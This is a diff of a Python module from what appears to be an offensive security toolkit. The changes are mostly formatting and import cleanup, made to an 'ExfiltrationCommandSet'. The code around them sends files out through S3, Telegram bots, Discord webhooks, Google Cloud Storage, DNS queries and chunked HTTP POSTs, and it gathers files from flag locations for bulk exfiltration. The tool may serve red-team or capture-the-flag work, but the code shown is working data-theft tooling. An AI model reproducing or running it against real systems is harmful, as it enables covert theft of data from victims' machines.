@@ -14,7 +14,6 @@ from __future__ import annotations
 import base64
 import gzip
 import hashlib
-import io
 import json
 import os
 import shlex
@@ -23,7 +22,7 @@ import subprocess
 import tempfile
 import time
 import zipfile
-from pathlib import Path
+from datetime import UTC
 
 import cmd2
 import requests
@@ -269,13 +268,13 @@ def _upload_s3_presigned(
     """
     import hashlib as _hashlib
     import hmac
-    from datetime import datetime, timezone
+    from datetime import datetime
 
     with open(file_path, "rb") as f:
         data = f.read()
 
-    amz_date = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
-    date_stamp = datetime.now(timezone.utc).strftime("%Y%m%d")
+    amz_date = datetime.now(UTC).strftime("%Y%m%dT%H%M%SZ")
+    date_stamp = datetime.now(UTC).strftime("%Y%m%d")
     service = "s3"
     algorithm = "AWS4-HMAC-SHA256"
     content_type = "application/octet-stream"
@@ -285,18 +284,26 @@ def _upload_s3_presigned(
     canonical_querystring = ""
     canonical_headers = f"content-type:{content_type}\nhost:{bucket}.s3.{region}.amazonaws.com\nx-amz-content-sha256:{payload_hash}\nx-amz-date:{amz_date}\n"
     signed_headers = "content-type;host;x-amz-content-sha256;x-amz-date"
-    canonical_request = f"PUT\n{canonical_uri}\n{canonical_querystring}\n{canonical_headers}\n{signed_headers}\n{payload_hash}"
+    canonical_request = (
+        f"PUT\n{canonical_uri}\n{canonical_querystring}\n{canonical_headers}\n{signed_headers}\n{payload_hash}"
+    )
 
     credential_scope = f"{date_stamp}/{region}/{service}/aws4_request"
-    string_to_sign = f"{algorithm}\n{amz_date}\n{credential_scope}\n{_hashlib.sha256(canonical_request.encode()).hexdigest()}"
+    string_to_sign = (
+        f"{algorithm}\n{amz_date}\n{credential_scope}\n{_hashlib.sha256(canonical_request.encode()).hexdigest()}"
+    )
 
     def _sign(key, msg):
         return hmac.new(key, msg.encode(), _hashlib.sha256).digest()
 
-    signing_key = _sign(_sign(_sign(_sign(("AWS4" + secret_key).encode(), date_stamp), region), service), "aws4_request")
+    signing_key = _sign(
+        _sign(_sign(_sign(("AWS4" + secret_key).encode(), date_stamp), region), service), "aws4_request"
+    )
     signature = hmac.new(signing_key, string_to_sign.encode(), _hashlib.sha256).hexdigest()
 
-    auth_header = f"{algorithm} Credential={access_key}/{credential_scope}, SignedHeaders={signed_headers}, Signature={signature}"
+    auth_header = (
+        f"{algorithm} Credential={access_key}/{credential_scope}, SignedHeaders={signed_headers}, Signature={signature}"
+    )
     url = f"https://{bucket}.s3.{region}.amazonaws.com/{object_key}"
 
     resp = requests.put(
@@ -1177,7 +1184,9 @@ class ExfiltrationCommandSet(LazyOwnCommandSet):
         """
         args = shlex.split(line)
         if len(args) < 1:
-            print_error("Usage: exfil_s3 <file_path> --bucket <name> --key <access_key> --secret <secret_key> [--region <region>]")
+            print_error(
+                "Usage: exfil_s3 <file_path> --bucket <name> --key <access_key> --secret <secret_key> [--region <region>]"
+            )
             return
 
         file_path = args[0]
@@ -1199,19 +1208,13 @@ class ExfiltrationCommandSet(LazyOwnCommandSet):
 
         try:
             import boto3
+
             s3 = boto3.client("s3", aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)
             s3.upload_file(file_path, bucket, object_key)
             print_msg(f"Uploaded {file_path} to s3://{bucket}/{object_key}")
         except ImportError:
             print_warn("boto3 not installed, using presigned URL approach")
-            try:
-                from botocore.signers import RequestSigner
-                from botocore.auth import S3SigV4Auth
-                from botocore.awsrequest import AWSRequest
-                import datetime
-                _upload_s3_presigned(file_path, bucket, object_key, access_key, secret_key, region)
-            except ImportError:
-                print_error("boto3 required for S3 exfiltration. Install: pip install boto3")
+            _upload_s3_presigned(file_path, bucket, object_key, access_key, secret_key, region)
         except Exception as e:
             print_error(f"S3 upload failed: {e}")
 
@@ -1246,14 +1249,14 @@ class ExfiltrationCommandSet(LazyOwnCommandSet):
         if file_size <= TELEGRAM_MAX_SIZE:
             _send_telegram_file(file_path, bot_token, chat_id, caption)
         else:
-            print_msg(f"File exceeds 50MB, splitting into chunks...")
+            print_msg("File exceeds 50MB, splitting into chunks...")
             chunk_dir = tempfile.mkdtemp(prefix="lazyexfil_")
             try:
                 _split_file(file_path, chunk_dir, TELEGRAM_MAX_SIZE)
                 chunks = sorted(os.listdir(chunk_dir))
                 for idx, chunk_name in enumerate(chunks):
                     chunk_path = os.path.join(chunk_dir, chunk_name)
-                    chunk_caption = f"{caption} [{idx+1}/{len(chunks)}]"
+                    chunk_caption = f"{caption} [{idx + 1}/{len(chunks)}]"
                     _send_telegram_file(chunk_path, bot_token, chat_id, chunk_caption)
                     time.sleep(1)
                 print_msg(f"Sent {len(chunks)} chunks via Telegram")
@@ -1289,14 +1292,14 @@ class ExfiltrationCommandSet(LazyOwnCommandSet):
         if file_size <= DISCORD_MAX_SIZE:
             _send_discord_file(file_path, webhook_url, custom_name)
         else:
-            print_msg(f"File exceeds 25MB, splitting into chunks...")
+            print_msg("File exceeds 25MB, splitting into chunks...")
             chunk_dir = tempfile.mkdtemp(prefix="lazyexfil_")
             try:
                 _split_file(file_path, chunk_dir, DISCORD_MAX_SIZE)
                 chunks = sorted(os.listdir(chunk_dir))
                 for idx, chunk_name in enumerate(chunks):
                     chunk_path = os.path.join(chunk_dir, chunk_name)
-                    chunk_label = f"{custom_name}.part{idx+1:03d}"
+                    chunk_label = f"{custom_name}.part{idx + 1:03d}"
                     _send_discord_file(chunk_path, webhook_url, chunk_label)
                     time.sleep(1)
                 print_msg(f"Sent {len(chunks)} chunks via Discord")
@@ -1335,6 +1338,7 @@ class ExfiltrationCommandSet(LazyOwnCommandSet):
 
         try:
             from google.cloud import storage
+
             client = storage.Client.from_service_account_json(key_path)
             blob = client.bucket(bucket).blob(prefix + os.path.basename(file_path))
             blob.upload_from_filename(file_path)
@@ -1375,10 +1379,11 @@ class ExfiltrationCommandSet(LazyOwnCommandSet):
             file_hash = hashlib.sha256(data).hexdigest()[:8]
             compressed = gzip.compress(data, compresslevel=9)
             encoded = base64.b32hexencode(compressed).decode().rstrip("=").lower()
-            chunks = [encoded[i:i+DNS_CHUNK_SIZE] for i in range(0, len(encoded), DNS_CHUNK_SIZE)]
+            chunks = [encoded[i : i + DNS_CHUNK_SIZE] for i in range(0, len(encoded), DNS_CHUNK_SIZE)]
             total = len(chunks)
 
             import dns.resolver
+
             resolver = dns.resolver.Resolver()
             resolver.nameservers = [dns_server]
 
@@ -1392,7 +1397,7 @@ class ExfiltrationCommandSet(LazyOwnCommandSet):
                 except Exception:
                     pass  # expected - DNS server won't resolve unknown names
                 if (idx + 1) % 50 == 0:
-                    print_msg(f"  Sent {idx+1}/{total} DNS queries")
+                    print_msg(f"  Sent {idx + 1}/{total} DNS queries")
                 time.sleep(0.1)
 
             print_msg(f"Exfiltrated {file_path} via {total} DNS queries to {domain}")
@@ -1449,12 +1454,17 @@ class ExfiltrationCommandSet(LazyOwnCommandSet):
                             "X-File-Name": file_name,
                             "X-File-Hash": file_hash,
                         }
-                        resp = requests.post(upload_url, files={field_name: (f"{file_name}.part{idx:04d}", chunk)}, headers=headers, timeout=30)
+                        resp = requests.post(
+                            upload_url,
+                            files={field_name: (f"{file_name}.part{idx:04d}", chunk)},
+                            headers=headers,
+                            timeout=30,
+                        )
                         if resp.status_code not in (200, 201, 204):
                             print_error(f"Chunk {idx} failed: HTTP {resp.status_code}")
                             return
                         if (idx + 1) % 10 == 0:
-                            print_msg(f"  Sent chunk {idx+1}/{total_chunks}")
+                            print_msg(f"  Sent chunk {idx + 1}/{total_chunks}")
 
                 print_msg(f"Exfiltrated {file_path} via {total_chunks} HTTP POST chunks")
             else:
@@ -1494,6 +1504,7 @@ class ExfiltrationCommandSet(LazyOwnCommandSet):
         ]
 
         import glob as glob_mod
+
         found = []
         for pattern in flag_locations:
             for match in glob_mod.glob(pattern):
@@ -1507,7 +1518,9 @@ class ExfiltrationCommandSet(LazyOwnCommandSet):
         print_msg(f"Found {len(found)} files to exfiltrate via {method}")
         for file_path in found:
             print_msg(f"  Exfiltrating: {file_path}")
-            cmd_line = f"exfil_{method} {file_path} " + " ".join(args[args.index("--method")+2:] if "--method" in args else [])
+            cmd_line = f"exfil_{method} {file_path} " + " ".join(
+                args[args.index("--method") + 2 :] if "--method" in args else []
+            )
             # Re-invoke the appropriate do_ method
             method_map = {
                 "telegram": self.do_exfil_telegram,
@@ -1588,7 +1601,7 @@ class ExfiltrationCommandSet(LazyOwnCommandSet):
             manifest["chunk_size"] = chunk_size
             base_name = f"stage_{timestamp}"
             for idx in range(total_chunks):
-                chunk = compressed[idx*chunk_size:(idx+1)*chunk_size]
+                chunk = compressed[idx * chunk_size : (idx + 1) * chunk_size]
                 chunk_path = os.path.join(output_dir, f"{base_name}.part{idx:04d}")
                 with open(chunk_path, "wb") as f:
                     f.write(chunk)
